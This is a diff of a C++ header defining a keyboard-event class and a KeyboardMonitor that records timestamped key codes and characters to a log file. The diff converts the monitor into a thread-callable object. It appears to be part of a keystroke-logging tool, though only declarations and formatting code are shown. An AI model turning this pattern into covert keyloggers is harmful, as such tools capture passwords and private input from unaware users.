@@ -1,9 +1,10 @@
 #pragma once
 
-#include <stdio.h>
 #include <iomanip>
 #include <list>
+#include <process.h>
 #include <sstream>
+#include <stdio.h>
 
 #include "BaseEvent.h"
 
@@ -29,6 +30,8 @@ public:
 		return m_virtualKeyCode;
 	}
 
+	std::string getString(void);
+
 #pragma region BaseEvent pverrides
 public:
 	virtual std::string toString(void)
@@ -37,7 +40,7 @@ public:
 		stream << "[LocalTime: " << m_localTime.wYear << "/" << m_localTime.wMonth << "/" << m_localTime.wDay << " ";
 		stream << m_localTime.wHour << ":" << m_localTime.wMinute << ":" << m_localTime.wSecond << ":" << m_localTime.wMilliseconds << "] ";
 		stream << "[Keyboard Event] "<< " KeyCode: 0x" << std::hex << m_virtualKeyCode << " ";
-		stream << "Character: " << getCharacter();
+		stream << "Character: " << getString();
 
 		return stream.str();
 	}
@@ -55,7 +58,7 @@ public:
 	KeyboardMonitor(std::string m_logFilePath, unsigned int maxListSize);
 	~KeyboardMonitor(void);
 
-	void StartMonitor(void);
+	void operator()();
 
 private:
 	bool appendToFile(void);
